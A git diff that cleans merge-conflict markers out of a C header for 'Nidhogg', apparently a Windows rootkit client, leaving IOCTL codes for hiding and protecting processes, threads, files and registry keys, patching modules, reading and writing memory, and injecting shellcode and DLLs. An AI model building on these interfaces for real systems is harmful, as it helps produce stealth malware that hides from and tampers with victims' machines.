@@ -4,15 +4,7 @@
 #include <sddl.h>
 #pragma comment(lib, "advapi32.lib")
 
-<<<<<<< HEAD
-<<<<<<< HEAD
-// ** IOCTL ************************************************************************************
-=======
-// ** IOCTL *************************************************************************************************
->>>>>>> 0a9676d (Pre version 0.1 (#6))
-=======
 // ** IOCTLS **********************************************************************************************
->>>>>>> a20f2bb (Updated client)
 #define IOCTL_NIDHOGG_PROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_PROCESS_PROTECTION CTL_CODE(0x8000, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -22,57 +14,11 @@
 #define IOCTL_NIDHOGG_SET_PROCESS_SIGNATURE_LEVEL CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_QUERY_PROTECTED_PROCESSES CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-<<<<<<< HEAD
-<<<<<<< HEAD
-<<<<<<< HEAD
-#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_QUERY_FILES CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-<<<<<<< HEAD
-#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
-=======
-#define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_FILE_PROTECTION CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
-#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
->>>>>>> 0a9676d (Pre version 0.1 (#6))
-=======
-#define IOCTL_NIDHOGG_PROTECT_REGITEM CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_REGITEM CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_REGITEMS CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_QUERY_REGITEMS CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
-<<<<<<< HEAD
->>>>>>> 9256dee (Added ability to query registry, processes and files)
-=======
-
-#define IOCTL_NIDHOGG_PATCH_MODULE CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
-<<<<<<< HEAD
->>>>>>> da4b5b2 (Added patching to the usermode side)
-=======
-#define IOCTL_NIDHOGG_WRITE_DATA CTL_CODE(0x8000, 0x80F, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_READ_DATA CTL_CODE(0x8000, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
->>>>>>> afd6daf (Nidhogg v0.2)
-// *********************************************************************************************************
-=======
-#define IOCTL_NIDHOGG_PROTECT_THREAD CTL_CODE(0x8000, 0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_UNPROTECT_THREAD CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_CLEAR_THREAD_PROTECTION CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_HIDE_THREAD CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
-#define IOCTL_NIDHOGG_QUERY_PROTECTED_THREADS CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
-=======
 #define IOCTL_NIDHOGG_PROTECT_THREAD CTL_CODE(0x8000, 0x808, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_UNPROTECT_THREAD CTL_CODE(0x8000, 0x809, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_CLEAR_THREAD_PROTECTION CTL_CODE(0x8000, 0x80A, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_HIDE_THREAD CTL_CODE(0x8000, 0x80B, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_QUERY_PROTECTED_THREADS CTL_CODE(0x8000, 0x80C, METHOD_BUFFERED, FILE_ANY_ACCESS)
->>>>>>> eafb5a2 (Updated the IOCTLs)
 
 #define IOCTL_NIDHOGG_PROTECT_FILE CTL_CODE(0x8000, 0x80D, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_UNPROTECT_FILE CTL_CODE(0x8000, 0x80E, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -90,7 +36,6 @@
 #define IOCTL_NIDHOGG_INJECT_SHELLCODE CTL_CODE(0x8000, 0x818, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_NIDHOGG_INJECT_DLL CTL_CODE(0x8000, 0x819, METHOD_BUFFERED, FILE_ANY_ACCESS)
 // *******************************************************************************************************
->>>>>>> a20f2bb (Updated client)
 
 // ** General Definitions ***************************************************************************************
 #define DRIVER_NAME LR"(\\.\Nidhogg)"
@@ -101,22 +46,7 @@
 #define NIDHOGG_INVALID_COMMAND 4
 #define NIDHOGG_INVALID_OPTION 5
 
-<<<<<<< HEAD
-<<<<<<< HEAD
-=======
 #define MAX_PATCHED_MODULES 256
-<<<<<<< HEAD
->>>>>>> da4b5b2 (Added patching to the usermode side)
-#define MAX_PIDS 256
-#define MAX_FILES 256
-
-<<<<<<< HEAD
-=======
->>>>>>> 0a9676d (Pre version 0.1 (#6))
-#define REG_TYPE_KEY 0
-#define REG_TYPE_VALUE 1
-=======
-=======
 #define MAX_FILES 256
 
 #define PROCESS_TYPE_PROTECTED 0
@@ -124,12 +54,10 @@
 #define MAX_PIDS 256
 #define MAX_TIDS 256
 
->>>>>>> afd6daf (Nidhogg v0.2)
 #define REG_TYPE_PROTECTED_KEY 0
 #define REG_TYPE_PROTECTED_VALUE 1
 #define REG_TYPE_HIDDEN_KEY 2
 #define REG_TYPE_HIDDEN_VALUE 3
->>>>>>> c5ff028 (Seperated hidden and protected registry items)
 #define REG_KEY_LEN 255
 #define REG_VALUE_LEN 260
 #define HKLM_HIVE LR"(\Registry\Machine)"
@@ -178,9 +106,6 @@ enum InjectionType {
 // *********************************************************************************************************
 
 // ** General Structures ***************************************************************************************
-<<<<<<< HEAD
-<<<<<<< HEAD
-=======
 struct PatchedModule {
 	ULONG Pid;
 	PVOID Patch;
@@ -189,7 +114,6 @@ struct PatchedModule {
 	WCHAR* ModuleName;
 };
 
->>>>>>> da4b5b2 (Added patching to the usermode side)
 struct ProcessesList {
 	int PidsCount;
 	ULONG Pids[MAX_PIDS];
@@ -206,16 +130,11 @@ struct ProcessSignature {
 	UCHAR SignatureSigner;
 };
 
-<<<<<<< HEAD
-=======
->>>>>>> 0a9676d (Pre version 0.1 (#6))
-=======
 struct FileItem {
 	int FileIndex;
 	WCHAR FilePath[MAX_PATH];
 };
 
->>>>>>> 9256dee (Added ability to query registry, processes and files)
 struct RegItem {
 	int RegItemsIndex;
 	ULONG Type;
